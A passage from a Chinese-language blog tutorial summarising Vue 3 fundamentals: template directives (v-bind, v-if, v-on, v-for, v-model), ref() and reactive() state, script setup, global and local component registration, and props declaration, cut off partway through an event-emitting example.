class="line">  if (newQuestion.indexOf(&#x27;?&#x27;) &gt; -1) &#123;</span><br><span class="line">    answer.value = &#x27;Thinking...&#x27;</span><br><span class="line">    try &#123;</span><br><span class="line">      const res = await fetch(&#x27;https://yesno.wtf/api&#x27;)</span><br><span class="line">      answer.value = (await res.json()).answer</span><br><span class="line">    &#125; catch (error) &#123;</span><br><span class="line">      answer.value = &#x27;Error! Could not reach the API. &#x27; + error</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    Ask a yes/no question:</span><br><span class="line">    &lt;input v-model=&quot;question&quot; /&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&#123;&#123; answer &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><p>双大括号不能在 HTML attributes 中使用。想要响应式地绑定一个 attribute，应该使用<code>v-bind</code> 指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><code>v-bind</code> 指令指示 Vue 将元素的 <code>id</code> attribute 与组件的 <code>dynamicId</code> 属性保持一致。如果绑定的值是 <code>null</code> 或者 <code>undefined</code>，那么该 attribute 将会从渲染的元素上移除。</p><p>因为 <code>v-bind</code> 非常常用，我们提供了特定的简写语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>v-bind可以携带一个“参数”，在指令名后通过一个冒号隔开做标识。例如用 <code>v-bind</code> 指令来响应式地更新一个 HTML attribute：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a v-bind:href=&quot;url&quot;&gt; ... &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 简写 --&gt;</span><br><span class="line">&lt;a :href=&quot;url&quot;&gt; ... &lt;/a&gt;</span><br></pre></td></tr></table></figure><p>这里 <code>href</code> 就是一个参数，它告诉 <code>v-bind</code> 指令将表达式 <code>url</code> 的值绑定到元素的 <code>href</code> attribute 上。在简写中，参数前的一切 (例如 <code>v-bind:</code>) 都会被缩略为一个 <code>:</code> 字符。</p><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p v-if=&quot;seen&quot;&gt;Now you see me&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这里，<code>v-if</code> 指令会基于表达式 <code>seen</code> 的值的真假来移除&#x2F;插入该 <code>&lt;p&gt;</code> 元素。</p><p>可以用v-else指令为v-if或v-show添加一个“else块”。<strong>v-else元素必须立即跟在v-if或v-show元素的后面——否则它不能被识别。</strong></p><h3 id="v-on"><a href="#v-on" class="headerlink" title="v-on"></a>v-on</h3><p><code>v-on</code> 指令的作用是监听 DOM 事件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a v-on:click=&quot;doSomething&quot;&gt; ... &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 简写 --&gt;</span><br><span class="line">&lt;a @click=&quot;doSomething&quot;&gt; ... &lt;/a&gt;</span><br></pre></td></tr></table></figure><p>这里的参数是要监听的事件名称：<code>click</code>。<code>v-on</code> 有一个相应的缩写，即 <code>@</code> 字符。</p><p>这里补充一下<strong>修饰符</strong></p><p>修饰符是以点开头的特殊后缀，表明指令需要以一些特殊的方式被绑定。例如 <code>.prevent</code> 修饰符会告知 <code>v-on</code> 指令对触发的事件调用 <code>event.preventDefault()</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form @submit.prevent=&quot;onSubmit&quot;&gt;...&lt;/form&gt;</span><br></pre></td></tr></table></figure><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><p>我们可以使用 <code>v-for</code> 指令基于一个数组来渲染一个列表。<code>v-for</code> 指令的值需要使用 <code>item in items</code> 形式的特殊语法，其中 <code>items</code> 是源数据的数组，而 <code>item</code> 是迭代项的<strong>别名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const items = ref([&#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125;])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;item in items&quot;&gt;</span><br><span class="line">  &#123;&#123; item.message &#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>在 <code>v-for</code> 块中可以完整地访问父作用域内的属性和变量。<code>v-for</code> 也支持使用可选的第二个参数表示当前项的位置索引。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const parentMessage = ref(&#x27;Parent&#x27;)</span><br><span class="line">const items = ref([&#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125;])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;li v-for=&quot;(item, index) in items&quot;&gt;</span><br><span class="line">  &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><p>Parent - 0 - Foo</p><p>Parent - 1 - Bar</p><h3 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h3><p><code>v-model</code> 可以在组件上使用以实现双向绑定。</p><p> <code>v-model</code> 在原生元素上的用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input v-model=&quot;searchText&quot; /&gt;</span><br></pre></td></tr></table></figure><p>在代码背后，模板编译器会对 <code>v-model</code> 进行更冗长的等价展开。因此上面的代码其实等价于下面这段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;input</span><br><span class="line">  :value=&quot;searchText&quot;</span><br><span class="line">  @input=&quot;searchText = $event.target.value&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><h2 id="响应式基础"><a href="#响应式基础" class="headerlink" title="响应式基础"></a>响应式基础</h2><h3 id="ref"><a href="#ref" class="headerlink" title="ref()"></a>ref()</h3><p>在组合式 API 中，推荐使用 <code>ref()</code> 函数来声明响应式状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const count = ref(0)</span><br></pre></td></tr></table></figure><p><code>ref()</code> 接收参数，并将其包裹在一个带有 <code>.value</code> 属性的 ref 对象中返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const count = ref(0)</span><br><span class="line"></span><br><span class="line">console.log(count) // &#123; value: 0 &#125;</span><br><span class="line">console.log(count.value) // 0</span><br><span class="line"></span><br><span class="line">count.value++</span><br><span class="line">console.log(count.value) // 1</span><br></pre></td></tr></table></figure><p>要在组件模板中访问 ref，请从组件的 <code>setup()</code> 函数中声明并返回它们：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  // `setup` 是一个特殊的钩子，专门用于组合式 API。</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const count = ref(0)</span><br><span class="line"></span><br><span class="line">    // 将 ref 暴露给模板</span><br><span class="line">    return &#123;</span><br><span class="line">      count</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>注意，在模板中使用 ref 时，我们<strong>不</strong>需要附加 <code>.value</code>。为了方便起见，当在模板中使用时，ref 会自动解包 </p><p>也可以直接在事件监听器中改变一个 ref：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;count++&quot;&gt;</span><br><span class="line">  &#123;&#123; count &#125;&#125;</span><br><span class="line">&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>对于更复杂的逻辑，我们可以在同一作用域内声明更改 ref 的函数，并将它们作为方法与状态一起公开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    const count = ref(0)</span><br><span class="line"></span><br><span class="line">    function increment() &#123;</span><br><span class="line">      // 在 JavaScript 中需要 .value</span><br><span class="line">      count.value++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 不要忘记同时暴露 increment 函数</span><br><span class="line">    return &#123;</span><br><span class="line">      count,</span><br><span class="line">      increment</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，暴露的方法可以被用作事件监听器：</p><p>template</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;increment&quot;&gt;</span><br><span class="line">  &#123;&#123; count &#125;&#125;</span><br><span class="line">&lt;/button&gt;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title="&lt;script setup&gt;"></a>&lt;script setup&gt;</h3><p>在 <code>setup()</code> 函数中手动暴露大量的状态和方法非常繁琐。幸运的是，我们可以通过使用<code>单文件组件 (SFC)</code> 来避免这种情况。我们可以使用 <code>&lt;script setup&gt;</code> 来大幅度地简化代码。&lt;script setup&gt; 中的顶层的导入、声明的变量和函数可在同一组件的模板中直接使用。你可以理解为模板是在同一作用域内声明的一个 JavaScript 函数——它自然可以访问与它一起声明的所有内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const count = ref(0)</span><br><span class="line"></span><br><span class="line">function increment() &#123;</span><br><span class="line">  count.value++</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;</span><br><span class="line">    &#123;&#123; count &#125;&#125;</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="reactive"><a href="#reactive" class="headerlink" title="reactive()"></a>reactive()</h3><p>还有另一种声明响应式状态的方式，即使用 <code>reactive()</code> API。与将内部值包装在特殊对象中的 ref 不同，<code>reactive()</code> 将使对象本身具有响应性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import &#123; reactive &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const state = reactive(&#123; count: 0 &#125;)</span><br></pre></td></tr></table></figure><p>在模板中使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;state.count++&quot;&gt;</span><br><span class="line">  &#123;&#123; state.count &#125;&#125;</span><br><span class="line">&lt;/button&gt;</span><br></pre></td></tr></table></figure><p><code>reactive()</code> 将深层地转换对象：当访问嵌套对象时，它们也会被 <code>reactive()</code> 包装。这一点和ref()一样</p><p>值得注意的是，<code>reactive()</code> 返回的是一个原始对象的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">Proxy</a>，它和原始对象是不相等的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const raw = &#123;&#125;</span><br><span class="line">const proxy = reactive(raw)</span><br><span class="line"></span><br><span class="line">// 代理对象和原始对象不是全等的</span><br><span class="line">console.log(proxy === raw) // false</span><br></pre></td></tr></table></figure><p>只有代理对象是响应式的，更改原始对象不会触发更新。因此，使用 Vue 的响应式系统的最佳实践是 <strong>仅使用你声明对象的代理版本</strong>。</p><p>为保证访问代理的一致性，对同一个原始对象调用 <code>reactive()</code> 会总是返回同样的代理对象，而对一个已存在的代理对象调用 <code>reactive()</code> 会返回其本身：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 在同一个对象上调用 reactive() 会返回相同的代理</span><br><span class="line">console.log(reactive(raw) === proxy) // true</span><br><span class="line"></span><br><span class="line">// 在一个代理上调用 reactive() 会返回它自己</span><br><span class="line">console.log(reactive(proxy) === proxy) // true</span><br></pre></td></tr></table></figure><p>这个规则对嵌套对象也适用。依靠深层响应性，响应式对象内的嵌套对象依然是代理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const proxy = reactive(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">const raw = &#123;&#125;</span><br><span class="line">proxy.nested = raw</span><br><span class="line"></span><br><span class="line">console.log(proxy.nested === raw) // false</span><br></pre></td></tr></table></figure><h4 id="reactive-的局限性"><a href="#reactive-的局限性" class="headerlink" title="reactive() 的局限性"></a>reactive() 的局限性</h4><ol><li><p><strong>有限的值类型</strong>：它只能用于对象类型 (对象、数组和如 <code>Map</code>、<code>Set</code> 这样的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects#keyed_collections">集合类型</a>)。它不能持有如 <code>string</code>、<code>number</code> 或 <code>boolean</code> 这样的<a href="https://developer.mozilla.org/en-US/docs/Glossary/Primitive">原始类型</a>。</p></li><li><p><strong>不能替换整个对象</strong>：由于 Vue 的响应式跟踪是通过属性访问实现的，因此我们必须始终保持对响应式对象的相同引用。这意味着我们不能轻易地“替换”响应式对象，因为这样的话与第一个引用的响应性连接将丢失：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">let state = reactive(&#123; count: 0 &#125;)</span><br><span class="line"></span><br><span class="line">// 上面的 (&#123; count: 0 &#125;) 引用将不再被追踪</span><br><span class="line">// (响应性连接已丢失！)</span><br><span class="line">state = reactive(&#123; count: 1 &#125;)</span><br></pre></td></tr></table></figure></li><li><p><strong>对解构操作不友好</strong>：当我们将响应式对象的原始类型属性解构为本地变量时，或者将该属性传递给函数时，我们将丢失响应性连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const state = reactive(&#123; count: 0 &#125;)</span><br><span class="line"></span><br><span class="line">// 当解构时，count 已经与 state.count 断开连接</span><br><span class="line">let &#123; count &#125; = state</span><br><span class="line">// 不会影响原始的 state</span><br><span class="line">count++</span><br><span class="line"></span><br><span class="line">// 该函数接收到的是一个普通的数字</span><br><span class="line">// 并且无法追踪 state.count 的变化</span><br><span class="line">// 我们必须传入整个对象以保持响应性</span><br><span class="line">callSomeFunction(state.count)</span><br></pre></td></tr></table></figure></li></ol><p>由于这些限制，官方建议使用 <code>ref()</code> 作为声明响应式状态的主要 API。</p><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><h3 id="定义一个组件"><a href="#定义一个组件" class="headerlink" title="定义一个组件"></a>定义一个组件</h3><p>当使用构建步骤时，我们一般会将 Vue 组件定义在一个单独的 <code>.vue</code> 文件中，这被叫做<a href="https://cn.vuejs.org/guide/scaling-up/sfc.html">单文件组件</a> (简称 SFC)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const count = ref(0)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125; times.&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>一个 Vue 组件在使用前需要先被“注册”，这样 Vue 才能在渲染模板时找到其对应的实现。组件注册有两种方式：全局注册和局部注册。</p><h3 id="全局注册"><a href="#全局注册" class="headerlink" title="全局注册"></a>全局注册</h3><p>我们可以使用 <a href="https://cn.vuejs.org/guide/essentials/application.html">Vue 应用实例</a>的 <code>.component()</code> 方法，让组件在当前 Vue 应用中全局可用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const app = createApp(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">app.component(</span><br><span class="line">  // 注册的名字</span><br><span class="line">  &#x27;MyComponent&#x27;,</span><br><span class="line">  // 组件的实现</span><br><span class="line">  &#123;</span><br><span class="line">    /* ... */</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>如果使用单文件组件，你可以注册被导入的 <code>.vue</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import MyComponent from &#x27;./App.vue&#x27;</span><br><span class="line"></span><br><span class="line">app.component(&#x27;MyComponent&#x27;, MyComponent)</span><br></pre></td></tr></table></figure><p><code>.component()</code> 方法可以被链式调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app</span><br><span class="line">  .component(&#x27;ComponentA&#x27;, ComponentA)</span><br><span class="line">  .component(&#x27;ComponentB&#x27;, ComponentB)</span><br><span class="line">  .component(&#x27;ComponentC&#x27;, ComponentC)</span><br></pre></td></tr></table></figure><p>全局注册的组件可以在此应用的任意组件的模板中使用</p><p>所有的子组件也可以使用全局注册的组件，这意味着这三个组件也都可以在<em>彼此内部</em>使用。</p><h3 id="局部注册"><a href="#局部注册" class="headerlink" title="局部注册"></a>局部注册</h3><p>全局注册虽然很方便，但有以下几个问题：</p><ol><li>全局注册，但并没有被使用的组件无法在生产打包时被自动移除 (也叫“tree-shaking”)。如果你全局注册了一个组件，即使它并没有被实际使用，它仍然会出现在打包后的 JS 文件中。</li><li>全局注册在大型项目中使项目的依赖关系变得不那么明确。在父组件中使用子组件时，不太容易定位子组件的实现。和使用过多的全局变量一样，这可能会影响应用长期的可维护性。</li></ol><p>相比之下，局部注册的组件需要在使用它的父组件中显式导入，并且只能在该父组件中使用。它的优点是使组件之间的依赖关系更加明确，并且对 tree-shaking 更加友好。</p><p>在使用 <code>&lt;script setup&gt;</code> 的单文件组件中，导入的组件可以直接在模板中使用，无需注册：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import ComponentA from &#x27;./ComponentA.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ComponentA /&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>如果没有使用 <code>&lt;script setup&gt;</code>，则需要使用 <code>components</code> 选项来显式注册：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import ComponentA from &#x27;./ComponentA.js&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    ComponentA</span><br><span class="line">  &#125;,</span><br><span class="line">  setup() &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于每个 <code>components</code> 对象里的属性，它们的 key 名就是注册的组件名，而值就是相应组件的实现。上面的例子中使用的是 ES2015 的缩写语法，等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">  components: &#123;</span><br><span class="line">    ComponentA: ComponentA</span><br><span class="line">  &#125;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意：<strong>局部注册的组件在后代组件中并不可用</strong>。在这个例子中，<code>ComponentA</code> 注册后仅在当前组件可用，而在任何的子组件或更深层的子组件中都不可用。</p><h3 id="组件名格式"><a href="#组件名格式" class="headerlink" title="组件名格式"></a>组件名格式</h3><p>在整个指引中，我们都使用 PascalCase 作为组件名的注册格式，这是因为：</p><ol><li>PascalCase 是合法的 JavaScript 标识符。这使得在 JavaScript 中导入和注册组件都很容易，同时 IDE 也能提供较好的自动补全。</li><li><code>&lt;PascalCase /&gt;</code> 在模板中更明显地表明了这是一个 Vue 组件，而不是原生 HTML 元素。同时也能够将 Vue 组件和自定义元素 (web components) 区分开来。</li></ol><p>在单文件组件和内联字符串模板中，我们都推荐这样做。但是，PascalCase 的标签名在 DOM 内模板中是不可用的，详情参见 <a href="https://cn.vuejs.org/guide/essentials/component-basics.html#in-dom-template-parsing-caveats">DOM 内模板解析注意事项</a>。</p><p>为了方便，Vue 支持将模板中使用 kebab-case 的标签解析为使用 PascalCase 注册的组件。这意味着一个以 <code>MyComponent</code> 为名注册的组件，在模板中可以通过 <code>&lt;MyComponent&gt;</code> 或 <code>&lt;my-component&gt;</code> 引用。这让我们能够使用同样的 JavaScript 组件注册代码来配合不同来源的模板。</p><h3 id="Props-声明"><a href="#Props-声明" class="headerlink" title="Props 声明"></a>Props 声明</h3><p>一个组件需要显式声明它所接受的 props，这样 Vue 才能知道外部传入的哪些是 props，哪些是透传 attribute</p><p>在使用 <code>&lt;script setup&gt;</code> 的单文件组件中，props 可以使用 <code>defineProps()</code> 宏来声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">const props = defineProps([&#x27;title&#x27;])</span><br><span class="line"></span><br><span class="line">console.log(props.title)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>注意传递给 <code>defineProps()</code> 的参数和提供给 <code>props</code> 选项的值是相同的，两种声明方式背后其实使用的都是 prop 选项。</p><p>除了使用字符串数组来声明 prop 外，还可以使用对象的形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 使用 &lt;script setup&gt;</span><br><span class="line">defineProps(&#123;</span><br><span class="line">  title: String,</span><br><span class="line">  likes: Number</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>对于以对象形式声明中的每个属性，key 是 prop 的名称，而值则是该 prop 预期类型的构造函数。比如，如果要求一个 prop 的值是 <code>number</code> 类型，则可使用 <code>Number</code> 构造函数作为其声明的值。</p><p>对象形式的 props 声明不仅可以一定程度上作为组件的文档，而且如果其他开发者在使用你的组件时传递了错误的类型，也会在浏览器控制台中抛出警告。</p><p>如果你正在搭配 TypeScript 使用 <code>&lt;script setup&gt;</code>，也可以使用类型标注来声明 props：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">defineProps&lt;&#123;</span><br><span class="line">  title?: string</span><br><span class="line">  likes?: number</span><br><span class="line">&#125;&gt;()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当一个 prop 被注册后，可以像这样以自定义 attribute 的形式传递数据给它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BlogPost title=&quot;My journey with Vue&quot; /&gt;</span><br></pre></td></tr></table></figure><p>所有的 props 都遵循着<strong>单向绑定</strong>原则，props 因父组件的更新而变化，自然地将新的状态向下流往子组件，而不会逆向传递。</p><h3 id="监听子组件事件"><a href="#监听子组件事件" class="headerlink" title="监听子组件事件"></a>监听子组件事件</h3><p>子组件可以通过调用内置的 <a href="https://cn.vuejs.org/api/component-instance.html#emit"><strong><code>$emit</code></strong> 方法</a>，通过传入事件名称来抛出一个事件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;blog-post&quot;&gt;</span><br><span class="line">    